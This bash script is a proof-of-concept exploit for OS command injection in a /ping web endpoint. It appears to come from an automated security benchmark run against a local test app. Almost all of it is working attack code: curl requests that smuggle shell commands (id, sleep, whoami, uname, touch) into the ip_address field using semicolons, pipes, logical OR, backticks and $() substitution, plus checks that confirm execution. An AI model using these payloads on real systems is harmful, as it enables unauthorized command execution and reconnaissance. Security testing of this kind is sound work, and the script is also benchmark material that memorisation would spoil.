#!/bin/bash
# POC: Demonstrates OS command injection vulnerability in the /ping endpoint via ip_address parameter. Tests multiple injection vectors including semicolon, pipe, logical operators, and command substitution.
# Target: ./repo
# Created: 2025-11-10T15:03:17.717Z
# Session: benchmark-XBEN-037-24-mht9nqa0

# OS Command Injection POC for /ping endpoint
# Demonstrates multiple command injection vectors

TARGET_URL="http://localhost:8080/ping"
RESULTS_FILE="/tmp/injection_test_results.txt"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "================================================"
echo "OS Command Injection POC - /ping Endpoint"
echo "================================================"
echo ""

# Test 1: Semicolon separator with id command
echo -e "${YELLOW}[*] Test 1: Semicolon separator (;)${NC}"
echo "Payload: 127.0.0.1;id"
RESPONSE=$(curl -s -X POST -d "ip_address=127.0.0.1;id" "$TARGET_URL" 2>&1)
if echo "$RESPONSE" | grep -q "uid="; then
    echo -e "${GREEN}[+] SUCCESS: Command execution confirmed (id command output visible)${NC}"
    echo "Response: $RESPONSE" | head -c 200
    echo ""
else
    echo "[*] Response: $RESPONSE" | head -c 200
    echo ""
fi
echo ""

# Test 2: Pipe separator with sleep for time-based detection
echo -e "${YELLOW}[*] Test 2: Pipe separator (|) with sleep${NC}"
echo "Payload: 127.0.0.1|sleep 3"
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -X POST -d "ip_address=127.0.0.1|sleep 3" "$TARGET_URL" 2>&1)
END_TIME=$(date +%s%N)
ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))
echo "Response time: ${ELAPSED_MS}ms"
if [ $ELAPSED_MS -ge 2500 ]; then
    echo -e "${GREEN}[+] SUCCESS: Time-based injection confirmed (3+ second delay detected)${NC}"
else
    echo "[*] Response received in normal timeframe"
fi
echo ""

# Test 3: Logical OR with sleep
echo -e "${YELLOW}[*] Test 3: Logical OR (||) with sleep${NC}"
echo "Payload: 127.0.0.1||sleep 3"
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -X POST -d "ip_address=127.0.0.1||sleep 3" "$TARGET_URL" 2>&1)
END_TIME=$(date +%s%N)
ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))
echo "Response time: ${ELAPSED_MS}ms"
if [ $ELAPSED_MS -ge 2500 ]; then
    echo -e "${GREEN}[+] SUCCESS: Time-based injection confirmed (3+ second delay detected)${NC}"
else
    echo "[*] Response received in normal timeframe"
fi
echo ""

# Test 4: Backtick substitution
echo -e "${YELLOW}[*] Test 4: Backtick substitution with sleep${NC}"
echo "Payload: 127.0.0.1\`sleep 3\`"
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -X POST -d "ip_address=127.0.0.1\`sleep 3\`" "$TARGET_URL" 2>&1)
END_TIME=$(date +%s%N)
ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))
echo "Response time: ${ELAPSED_MS}ms"
if [ $ELAPSED_MS -ge 2500 ]; then
    echo -e "${GREEN}[+] SUCCESS: Time-based injection confirmed (3+ second delay detected)${NC}"
else
    echo "[*] Response received in normal timeframe"
fi
echo ""

# Test 5: Command substitution with $()
echo -e "${YELLOW}[*] Test 5: Command substitution \$() with sleep${NC}"
echo "Payload: 127.0.0.1\$(sleep 3)"
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -X POST -d "ip_address=127.0.0.1\$(sleep 3)" "$TARGET_URL" 2>&1)
END_TIME=$(date +%s%N)
ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))
echo "Response time: ${ELAPSED_MS}ms"
if [ $ELAPSED_MS -ge 2500 ]; then
    echo -e "${GREEN}[+] SUCCESS: Time-based injection confirmed (3+ second delay detected)${NC}"
else
    echo "[*] Response received in normal timeframe"
fi
echo ""

# Test 6: File creation via touch
echo -e "${YELLOW}[*] Test 6: File creation via touch${NC}"
echo "Payload: 127.0.0.1;touch /tmp/pwned_injection_test.txt"
RESPONSE=$(curl -s -X POST -d "ip_address=127.0.0.1;touch /tmp/pwned_injection_test.txt" "$TARGET_URL" 2>&1)
sleep 1
if [ -f "/tmp/pwned_injection_test.txt" ]; then
    echo -e "${GREEN}[+] SUCCESS: File created via command injection${NC}"
    rm -f /tmp/pwned_injection_test.txt
else
    echo "[*] File not created (expected if /tmp not accessible)"
fi
echo ""

# Test 7: whoami command injection
echo -e "${YELLOW}[*] Test 7: whoami command injection${NC}"
echo "Payload: 127.0.0.1;whoami"
RESPONSE=$(curl -s -X POST -d "ip_address=127.0.0.1;whoami" "$TARGET_URL" 2>&1)
if echo "$RESPONSE" | grep -qiE "(root|daytona|www|apache|nginx)"; then
    echo -e "${GREEN}[+] SUCCESS: User enumeration possible${NC}"
    echo "Response contains user information: $(echo $RESPONSE | grep -oiE '(root|daytona|www|apache|nginx)')"
else
    echo "[*] Response: $RESPONSE" | head -c 200
fi
echo ""

# Test 8: uname command injection
echo -e "${YELLOW}[*] Test 8: OS information extraction via uname${NC}"
echo "Payload: 127.0.0.1;uname -a"
RESPONSE=$(curl -s -X POST -d "ip_address=127.0.0.1;uname -a" "$TARGET_URL" 2>&1)
if echo "$RESPONSE" | grep -q "Linux"; then
    echo -e "${GREEN}[+] SUCCESS: OS information disclosed${NC}"
    echo "Response: $RESPONSE" | head -c 300
else
    echo "[*] Response: $RESPONSE" | head -c 200
fi
echo ""

echo "================================================"
echo "POC Testing Complete"
echo "================================================"